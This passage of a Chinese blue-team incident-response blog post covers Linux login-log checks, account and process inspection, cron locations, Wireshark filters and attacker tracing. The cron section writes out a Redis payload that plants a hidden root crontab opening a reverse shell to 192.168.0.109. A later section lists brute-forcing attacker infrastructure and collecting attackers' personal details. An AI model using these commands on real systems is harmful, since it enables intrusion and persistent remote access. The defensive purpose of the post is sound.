查看日志存放位置</span><br></pre></td></tr></tbody></table></figure>
+
+<p>比较重要的几个日志</p>
+<p>登陆失败记录：/var/log/btmp 	//输入lastb直接查看</p>
+<p>登陆成功记录：/var/log/wtmp	 //输入last直接查看</p>
+<p>目前登陆用户信息：/var/log/utmp </p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">last 命令：</span><br><span class="line">功能说明：列出目前与过去登入系统的用户相关信息。</span><br><span class="line">　　语　　法：last [-adRx][-f ][-n ][帐号名称...][终端机编号...]</span><br><span class="line">　　补充说明：单独执行last指令，它会读取位于/var/log目录下，名称为wtmp的文件，并把该给文件的内容记录的登入系统的用户名单全部显示出来。</span><br><span class="line">　　参　　数：</span><br><span class="line">　　-a 　把从何处登入系统的主机名称或IP地址，显示在最后一行。</span><br><span class="line">　　-d 　将IP地址转换成主机名称。</span><br><span class="line">　　-f  　指定记录文件。</span><br><span class="line">　　-n 或- 　设置列出名单的显示列数。</span><br><span class="line">　　-R 　不显示登入系统的主机名称或IP地址。</span><br><span class="line">　　-x 　显示系统关机，重新开机，以及执行等级的改变等信息。</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>密码验证失败</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Fail password" /var/log/auth.log | wc -l</span><br></pre></td></tr></tbody></table></figure>
+
+<p>密码验证成功</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Accepted password for" /var/log/auth.log</span><br></pre></td></tr></tbody></table></figure>
+
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">lsof -i:22	//查看是否开启22端口</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看每个ip失败的次数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/auth.log | awk '(if (NF==16) {c[$13]++}else{c[$11]++}}END{for(u in c)print u,c[u]}' | sort -k 2 -nr | head</span><br><span class="line"></span><br><span class="line">grep "Failed password" /var/log/auth.log:</span><br><span class="line">	从 /var/log/auth.log 文件中提取包含 "Failed password" 的所有行。这通常表示登录失败的尝试。</span><br><span class="line">awk '(if (NF==16) {c[$13]++}else{c[$11]+ }):</span><br><span class="line">	awk 命令用于处理文本行。在这里，使用 NF 变量（表示当前行的字段数）来判断行的结构。如果字段数为 16，则增加关联数组 c 中，以 \$13（通常表示失败尝试的用户名或 IP 地址）为索引的计数。如果字段数不是 16，则使用 \$11（通常表示失败尝试的用户名或 IP 地址）来增加计数。</span><br><span class="line">END{for(u in c)print u,c[u]}:</span><br><span class="line">	在处理完所有输入后，输出数组 c 的内容，打印每个用户名（或 IP 地址）及其对应的失败登录尝试次数。</span><br><span class="line">sort -k 2 -nr:</span><br><span class="line">	对输出进行排序，按第二列（即失败尝试次数）进行降序排序。</span><br><span class="line">head:</span><br><span class="line">	显示排序后的前几行（默认是 10 行），这些行显示了最频繁的失败密码尝试者。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看每个用户名失败的次数</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep "Failed password" /var/log/auth.log | awk '{if (NF==16) {c[$11]++}else{c[$9]++}}END{for(u in c)print u,c[u]}' | sort -k 2 -nr | head</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看是否有与uid=0的（与root同权限的用户）</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: '$3==0{print $1}' /etc/passwd</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看是否有空口令账户</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">awk -F: 'length($2)==0 {print $1}' /etc/shadow</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="进程分析-1"><a href="#进程分析-1" class="headerlink" title="进程分析"></a>进程分析</h3><h4 id="进程和网络连接状态"><a href="#进程和网络连接状态" class="headerlink" title="进程和网络连接状态"></a>进程和网络连接状态</h4><p>网络连接命令netstat</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">-a: 显示所有连接和监听的端口。</span><br><span class="line">-t: 显示 TCP 连接。</span><br><span class="line">-u: 显示 UDP 连接。</span><br><span class="line">-l: 仅显示在监听状态的服务。</span><br><span class="line">-n: 以数字形式显示地址和端口号，而不是尝试解析服务名。</span><br><span class="line">-p: 显示哪个进程在使用该 socket（需要 root 权限）。</span><br><span class="line">-r: 显示路由表。</span><br><span class="line">-i: 显示网络接口的信息。</span><br><span class="line">-s: 显示网络统计信息。</span><br><span class="line">-c: 持续输出网络状态，直到手动停止（Ctrl+C）。</span><br><span class="line"></span><br><span class="line">## netstat -antp</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看可疑进程的对应可执行程序</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">## ls -alt /proc/PID</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看可疑进程打开了哪些文件</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">## lsof -p PID 			</span><br><span class="line">	lsof(List Open Files): 命令本身，用于列出当前系统中打开的文件。</span><br><span class="line">	-p: 这个选项后接一个进程 ID (PID)，用于指定要查询的特定进程。</span><br><span class="line">	PID: 代表进程 ID，是一个数字，指的就是你想查看的进程的具体 ID。</span><br><span class="line">	运行 lsof -p PID 可以帮助你了解该进程打开了哪些文件，包括常规文件、设备文件、网络套接字等。这在排查问题、监控进程状态和进行系统性能调优时非常有用。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看隐藏进程</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">## ps -ef | awk '{print}' | sort -n | uniq &gt; 1</span><br><span class="line"></span><br><span class="line">ps -ef:</span><br><span class="line">	这个命令用于列出当前系统中的所有进程，-e 选项表示显示所有用户的进程，-f 选项表示以完整格式显示。这将输出每个进程的详细信息。</span><br><span class="line">|:</span><br><span class="line">	管道符用于将左侧命令的输出作为右侧命令的输入。</span><br><span class="line">awk '{print}':</span><br><span class="line">	awk 是一个文本处理工具。在这里，'{print}' 将输入的每一行打印出来。实际上，这一步并没有改变输出，只是再次输出了 ps -ef 的结果。</span><br><span class="line">sort -n:</span><br><span class="line">	sort 命令用于对输入进行排序。-n 选项表示按数值进行排序，但因为没有具体的排序字段，这一步可能不太有意义，尤其是在处理进程信息时。它会对整行进行字典排序。</span><br><span class="line">uniq:</span><br><span class="line">	uniq 用于去除重复的行。由于 uniq 只能删除相邻的重复行，所以通常在此之前要使用 sort 命令，以确保相同的行在一起。</span><br><span class="line">&gt; 1:</span><br><span class="line">	将最终的输出重定向到名为 1 的文件中。如果该文件已存在，则内容会被覆盖。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">## ls /proc | sort -n | uniq &gt; 2</span><br><span class="line"></span><br><span class="line">ls /proc:</span><br><span class="line">	ls 命令用于列出指定目录中的文件和子目录。在这个上下文中，它将列出 /proc 目录中的所有条目。/proc 是一个虚拟文件系统，包含关于当前系统进程和内核的信息。这里的输出通常会是许多进程 ID（数字）和一些其他系统信息（如 sys, self, uptime 等）。</span><br><span class="line">|:</span><br><span class="line">	管道符，将 ls 的输出传递给下一个命令。</span><br><span class="line">sort -n:</span><br><span class="line">	sort 命令用于对输入内容进行排序，-n 选项表示按数值顺序排序。这对于 /proc 目录下的数字（表示进程 ID）是合适的，因为它们可以根据数值大小进行有效排序。</span><br><span class="line">uniq:</span><br><span class="line">	uniq 命令用于去除重复的行。由于 ls 输出的内容已经按照数字排序，因此 uniq 将删除相邻的重复行。虽然在通常情况下，/proc 目录中的文件条目不会有重复的进程 ID，但如果有其他类型的文件名重复，它也会被去掉。</span><br><span class="line">&gt; 2:</span><br><span class="line">	这个部分用于将最终的输出重定向到名为 2 的文件中。如果文件 2 已存在，内容将被覆盖。如果文件不存在，则会创建一个新文件</span><br><span class="line"></span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h3 id="计划任务"><a href="#计划任务" class="headerlink" title="计划任务"></a>计划任务</h3><p>计划任务路径</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/var/spool/cron/crontabs</span><br><span class="line">/var/spool/cron/root</span><br></pre></td></tr></tbody></table></figure>
+
+<p>查看计划任务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">crontab -u root -l</span><br></pre></td></tr></tbody></table></figure>
+
+<p>redis写隐藏计划任务</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">set shell "\n\n*/1 * * * * /bin/bash -i&gt;&amp;/dev/tcp/192.168.0.109/2222 0&gt;&amp;1\n\n"</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">save</span><br><span class="line"></span><br><span class="line">crontab -u root -l 这个命令是无法查看redis这个隐藏计划任务的，只能去/var/spool/cron/root里查看</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="流量分析"><a href="#流量分析" class="headerlink" title="#流量分析"></a>#流量分析</h2><h3 id="Wireshark的使用"><a href="#Wireshark的使用" class="headerlink" title="Wireshark的使用"></a>Wireshark的使用</h3><h5 id="网卡选择模式"><a href="#网卡选择模式" class="headerlink" title="网卡选择模式"></a>网卡选择模式</h5><p>开启混杂模式<br>局域网的所有流是都会发送给我们的电脑，默认情况下，我们的电脑只会对自己mac的流是进行解包，而丢弃其他mac的数据包。<br>开启混杂模式后，我们就可以解析其他mac的数据包，因此，我们使用Wireshark时，通常都会开启混杂模式。<br>点击菜单栏的[捕获」按钮，点击[选项]</p>
+<h5 id="过滤器"><a href="#过滤器" class="headerlink" title="过滤器"></a>过滤器</h5><p>1、捕获过滤器</p>
+<p>在抓包之前就设定好过滤条件，然后只抓取符合条件的数据包</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">过滤基本的语去格式：BPF语法格式。</span><br><span class="line">1）BPF语法</span><br><span class="line">BPF(全称Berkeley Packet Filter)，中文叫伯克利封包过滤器，它有四个核心元素：类型、方向、协议和逻辑运算符。</span><br><span class="line">1.类型Type:主机(host)、网段(net)、端口(port)</span><br><span class="line">2.方向Dir:源地址(src)、目标地址(dst)</span><br><span class="line">3.协议Proto:各种网络协议,比如:tcp、udp、http</span><br><span class="line">4.逻辑运算符:与（&amp;&amp;）、或（II）、非（！）</span><br><span class="line">四个元素可以自由组合，比如：</span><br><span class="line">1. src host 192.168.31.1:抓取源IP为192.168.31.1的数据包</span><br><span class="line">2. tcp || udp:抓取 TCP 或者 UDP 协议的数据包</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>2、显示过滤器</p>
+<p>在已捕获的数居包集合中设置过滤条件，隐藏不想显示的数据包，只显示符合条件的数据包。</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">显示过滤器的语法包含5个核心元素：IP、端口、协议、比较运算符和逻辑运算符。</span><br><span class="line">1.IP地址:ip.addr、ip.src、ip.dst</span><br><span class="line">2.端口:tcp.port、tcp.srcport、tcp.dstport</span><br><span class="line">3.协议:tcp、udp、http</span><br><span class="line">4.比较运算符:&gt; &lt; == &gt;= &lt;= !=</span><br><span class="line">5.逻辑运算符：and、or、not、xor（有且仅有一个条件被满足)</span><br><span class="line"></span><br><span class="line">5个核心元案可以自由组合，比如：</span><br><span class="line">- ip.addr == 192.168.32.121:显示IP地址为192.168.32.121的数据包</span><br><span class="line">- tcp.port == 80：显示端口为80的数据包</span><br><span class="line">使用方法：在过滤栏输入过滤语句，修改后立即生效</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<p>3、过滤器具体写法</p>
+<p>显示过滤器写法</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1、过滤值比较符号及表达式之间的组合</span><br><span class="line">2、针对ip的过滤</span><br><span class="line">3、针对协议的过滤</span><br><span class="line">4、针对端口的过滤（视传输协议而定)</span><br><span class="line">5、针对长度和内容的过滤</span><br><span class="line">5、针对http请求的一些过滤实例。</span><br></pre></td></tr></tbody></table></figure>
+
+<p>捕捉过滤器写法</p>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1、比较符号</span><br><span class="line">2、常用表达式实例</span><br></pre></td></tr></tbody></table></figure>
+
+<p>注意：这两种过滤器所便用的语法是完全不同的，捕捉网卡数据的其实并不是Wireshark，而是WinPcap，当然要按WinPcap的规则来，显示过滤器就是Wireshark对已捕捉的数据进行筛选。</p>
+<p>使用捕获过滤器的主要原因就是性能。如果你知道并不需要分析某个类型的流量，那么可以简单地便用捕获过滤器过滤掉它，从而节省那些会被用来捕获这些数据包的处理器资源。当处理大是数据的时候，使用捕获过滤器是相当好用的。</p>
+<p>Wireshark拦截通过网卡访问的所有数据，前提是没有设置任何代理。Wireshark不能拦截本地回环访问的请求，即127.0.0.1或者localhost。</p>
+<p>4、显示过滤器具体写法</p>
+<ol>
+<li>针对ip的过滤</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(1)源地址进行过滤</span><br><span class="line">ip.src == 192.168.0.1</span><br><span class="line"></span><br><span class="line">(2)对目的地址进行过滤</span><br><span class="line">ip.dst == 192.168.0.1</span><br><span class="line"></span><br><span class="line">(3)对源地址或者目的地址进行过滤</span><br><span class="line">ip.addr == 192.168.0.1</span><br><span class="line">如果想排除以上的数据包，只需要用括号，然后使用"!"即可</span><br><span class="line">!(ip.addr == 192.168.0.1)</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="2">
+<li>针对协议的过滤</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">(1)获某种协议的数据包，表达式很简单仅仅需要把协议的名字输入即可</span><br><span class="line">http</span><br><span class="line">注意：是区分大小写，只能为小写</span><br><span class="line">(2)捕获多种协议的数据包</span><br><span class="line">http or telnet</span><br><span class="line">(3)排除某种协议的数据包</span><br><span class="line">not arp 或者 !tcp</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="3">
+<li>针对端口的过滤（视传输协议而定）</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(1)捕获某一端口的数据包(以tcp协议为例)</span><br><span class="line">tcp.port == 80</span><br><span class="line">(2)捕获多端口的数据包，可以使用and来连接，下面是捕获高于某端口的表达式（以udp协议为例）</span><br><span class="line">udp.port &gt;= 2048</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="4">
+<li>针对长度和内容的过滤</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(1)针对长度的过虑（这里的长度指定的是数据段的长度）</span><br><span class="line">udp.length &lt; 20		http.content_length &lt;= 30s</span><br><span class="line">(2)针对uri内容的过滤</span><br><span class="line">http.request.uri matches 'user'(请求的uri中包含"user"关键字的)</span><br><span class="line">注意：matches后的关键字是不区分大小写的！</span><br><span class="line"></span><br><span class="line">http.request.uri contains 'user'(请求的uri中包含“user"关键字的)</span><br><span class="line">注意：contains后的关键字是区分大小写的！</span><br></pre></td></tr></tbody></table></figure>
+
+<ol start="5">
+<li>针对http请求的一些过滤实例</li>
+</ol>
+<figure class="highlight plaintext"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">(1)过滤出请求地址中包含“user”的请求，不包括域名；</span><br><span class="line">http.request.uri contains 'user'</span><br><span class="line">(2)精确过滤域名</span><br><span class="line">http.host == baidu.com</span><br><span class="line">(3)模糊过滤城名</span><br><span class="line">http.host contains 'baidu'</span><br><span class="line">(4)过滤请求content_type类型</span><br><span class="line">http.content_type =='text/html'</span><br><span class="line">(5)过滤http请求方法</span><br><span class="line">http.request.method=='POST'</span><br><span class="line">(6)过滤tcp端口</span><br><span class="line">tcp.port == 80</span><br><span class="line">http &amp;&amp; tcp.port == 80 or tcp.port == 5566</span><br><span class="line">(7)过滤http响应状态码</span><br><span class="line">http.response.code == 302</span><br><span class="line">(8)过滤含有指定cookie的http数据包</span><br><span class="line">http.cookie contains 'userid'</span><br><span class="line"></span><br><span class="line">比较符号</span><br><span class="line">与:&amp;(and)</span><br><span class="line">或:|(or)</span><br><span class="line">非:！(not)</span><br><span class="line">实例:</span><br><span class="line">src or dst portrange 6000-8000 &amp;&amp; tcp or ip6</span><br></pre></td></tr></tbody></table></figure>
+
+
+
+<h2 id="溯源的方法"><a href="#溯源的方法" class="headerlink" title="#溯源的方法"></a>#溯源的方法</h2><h3 id="入场前期工作"><a href="#入场前期工作" class="headerlink" title="入场前期工作"></a>入场前期工作</h3><h4 id="1-明确网络区域划分"><a href="#1-明确网络区域划分" class="headerlink" title="1 明确网络区域划分"></a>1 明确网络区域划分</h4><p>DMZ区、办公终端区、核心业务区、上下游公司、供应链接入区</p>
+<h4 id="2-明确现有安全设备"><a href="#2-明确现有安全设备" class="headerlink" title="2 明确现有安全设备"></a>2 明确现有安全设备</h4><h5 id="设备类型"><a href="#设备类型" class="headerlink" title="设备类型"></a>设备类型</h5><p>网络层设备、终端层设备、蜜罐、日志汇总态势类</p>
+<h5 id="设备覆盖范围"><a href="#设备覆盖范围" class="headerlink" title="设备覆盖范围"></a>设备覆盖范围</h5><h5 id="现有告警质量"><a href="#现有告警质量" class="headerlink" title="现有告警质量"></a>现有告警质量</h5><p>告警种类、告警误报评估</p>
+<h4 id="3-已有资产梳理"><a href="#3-已有资产梳理" class="headerlink" title="3 已有资产梳理"></a>3 已有资产梳理</h4><h5 id="公网暴露资产"><a href="#公网暴露资产" class="headerlink" title="公网暴露资产"></a>公网暴露资产</h5><p>IP、域名、运行服务、中间件、账号口令、源码泄露、远程接入点（VPN、RDP、VNC、远程终端管理系统）</p>
+<h5 id="内网资产"><a href="#内网资产" class="headerlink" title="内网资产"></a>内网资产</h5><p>IP、系统版本、开放服务、账号口令、重点关注资产（域控机器、运维人员机器、堡垒机、自动化运维、邮件系统、OA、wiki等）</p>
+<h4 id="4-公司运营业务数据（防钓鱼）"><a href="#4-公司运营业务数据（防钓鱼）" class="headerlink" title="4 公司运营业务数据（防钓鱼）"></a>4 公司运营业务数据（防钓鱼）</h4><p>公司内部组织架构、上下游公司、运维 IT 财务 人事等部门信息 以及相关人员对接信息、通信手段 通信格式等</p>
+<h3 id="溯源反制"><a href="#溯源反制" class="headerlink" title="溯源反制"></a>溯源反制</h3><p>从蜜罐收集到<strong>可疑的IP或域名</strong>后</p>
+<h4 id="主动访问扫描探测"><a href="#主动访问扫描探测" class="headerlink" title="主动访问扫描探测"></a>主动访问扫描探测</h4><h5 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h5><p>通过ip扫描出的web页面</p>
+<p>1、个人博客–昵称简介备案等信息</p>
+<p>2、红队设施–弱口令、爆破、其他漏洞</p>
+<h5 id="爆破"><a href="#爆破" class="headerlink" title="爆破"></a>爆破</h5><p>1、RDP</p>
+<p>2、SSH爆破</p>
+<p>3、FTP爆破</p>
+<p>4、各类数据库（MySQL、MSSQL、Redis、MongoDB）</p>
+<p>​	</p>
+<h4 id="情报搜集"><a href="#情报搜集" class="headerlink" title="情报搜集"></a>情报搜集</h4><h5 id="威胁情报、沙箱"><a href="#威胁情报、沙箱" class="headerlink" title="威胁情报、沙箱"></a>威胁情报、沙箱</h5><p>360、奇安信、微步</p>
+<h5 id="搜索引擎"><a href="#搜索引擎" class="headerlink" title="搜索引擎"></a>搜索引擎</h5><p>1、百度、谷歌</p>
+<p>2、fofa、zoomeye–历史资产服务、现有资产服务</p>
+<h5 id="阿里云、腾讯云、华为云"><a href="#阿里云、腾讯云、华为云" class="headerlink" title="阿里云、腾讯云、华为云"></a>阿里云、腾讯云、华为云</h5><p>1、IP找回账号</p>
+<p>2、域名找回账号</p>
+<h5 id="IP定位"><a href="#IP定位" class="headerlink" title="IP定位"></a>IP定位</h5><p><a target="_blank" rel="noopener" href="http://www.ipplus360.com/about/us">http://www.ipplus360.com/about/us</a></p>
+<p>得到攻击者信息后</p>
+<p>攻击者信息：虚拟IP、手机号码、姓名、邮箱、QQ号</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      
+      
+      
+      
+      
+      
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item" data-aos="zoom-in"><a class="article-tag-list-link" href="/en/tags/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" rel="tag">应急响应</a></li></ul>
+
+
+    </footer>
+  </div>
+  
+  <nav id="article-nav" data-aos="fade-up">
+    
+      
+      <div class="article-nav-link-wrap article-nav-link-left">
+        
+          
+          
+            <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="Shiro漏洞" class="lazyload">
+          
+        
+        <a href="/en/2025/04/10/shiro-lou-dong/"></a>
+        <div class="article-nav-caption">Prev</div>
+        <h3 class="article-nav-title">
+          
+            Shiro漏洞
+          
+        </h3>
+      </div>
+    
+    
+    
+    <div class="article-nav-link-wrap article-nav-link-right">
+      
+        
+        
+          <img data-src="/images/%E7%8E%9B%E8%8E%8E%E6%8B%89%E8%92%82.jpg" data-sizes="auto" alt="JAVA内存马" class="lazyload">
+        
+      
+      <a href="/en/2025/04/06/java-nei-cun-ma/"></a>
+      <div class="article-nav-caption">Next</div>
+      <h3 class="article-nav-title">
+        
+          JAVA内存马
+        
+      </h3>
+    </div>
+    
+  </nav>
+
+
+</article>
+
+
+
+
+
+
+
+
+
+
+</section>
+        </div>
+        <footer id="footer">
+  <div style="width: 100%; overflow: hidden">
+    <div class="footer-line"></div>
+  </div>
+  <div id="footer-info">
+    
+    <div>
+      <span class="icon-copyright"></span>
+      
+      
+      
+        2024-2025
+      
+      <span class="footer-info-sep "></span>
+      mX1@0
+    </div>
+    
+      <div>
+        Powered by&nbsp;<a href="https://hexo.io/" rel="noopener external nofollow noreferrer" target="_blank">Hexo</a>&nbsp;
+        Theme.<a href="https://github.com/D-Sketon/hexo-theme-reimu" rel="noopener external nofollow noreferrer" target="_blank">Reimu</a>
+      </div>
+    
+    
+      <div>
+        <span class="icon-brush"></span>
+        203.1k
+        &nbsp;|&nbsp;
+        <span class="icon-coffee"></span>
+        12:28
+      </div>
+    
+    
+    
+    
+    
+      <div>
+        <span class="icon-eye"></span>
+        <span id="busuanzi_container_site_pv">Number of visits&nbsp;<span id="busuanzi_value_site_pv"></span></span>
+        &nbsp;|&nbsp;
+        <span class="icon-user"></span>
+        <span id="busuanzi_container_site_uv">Number of visitors&nbsp;<span id="busuanzi_value_site_uv"></span></span>
+      </div>
+    
+  </div>
+</footer>
+
+        
+          <div class="sidebar-top">
+            <div class="sidebar-top-taichi rotate"></div>
+            <div class="arrow-up"></div>
+          </div>
+        
+        <div id="mask" class="hide"></div>
+      </div>
+      <nav id="mobile-nav">
+  <div class="sidebar-wrap">
+    
+      
+        <div class="sidebar-toc-sidebar"><div class="sidebar-toc">
+  <h3 class="toc-title">Contents</h3>
+  <div class="sidebar-toc-wrapper toc-div-class" >
+      
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E8%93%9D%E9%98%9F%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94%E7%AC%94%E8%AE%B0"><span class="toc-number">1.</span> <span class="toc-text">蓝队应急响应笔记</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Windows%E6%8E%92%E6%9F%A5"><span class="toc-number">1.1.</span> <span class="toc-text">#Windows排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E6%9E%90"><span class="toc-number">1.1.1.</span> <span class="toc-text">日志分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%97%A5%E5%BF%97%E5%88%86%E7%B1%BB"><span class="toc-number">1.1.1.1.</span> <span class="toc-text">日志分类</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#Web%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.1.1.1.</span> <span class="toc-text">Web日志</span></a></li><li class="toc-item toc-level-5"><a class="toc-link" href="#%E7%B3%BB%E7%BB%9F%E6%97%A5%E5%BF%97"><span class="toc-number">1.1.1.1.2.</span> <span class="toc-text">系统日志</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%96%87%E4%BB%B6%E5%88%86%E6%9E%90"><span class="toc-number">1.1.2.</span> <span class="toc-text">文件分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%9B%E7%A8%8B%E5%88%86%E6%9E%90"><span class="toc-number">1.1.3.</span> <span class="toc-text">进程分析</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%90%AF%E5%8A%A8%E3%80%81%E8%AE%A1%E5%88%92%E4%BB%BB%E5%8A%A1"><span class="toc-number">1.1.4.</span> <span class="toc-text">自启动、计划任务</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Linux%E6%8E%92%E6%9F%A5"><span class="toc-number">1.2.</span> <span class="toc-text">#Linux排查</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E7%9B%AE%E5%BD%95"><span 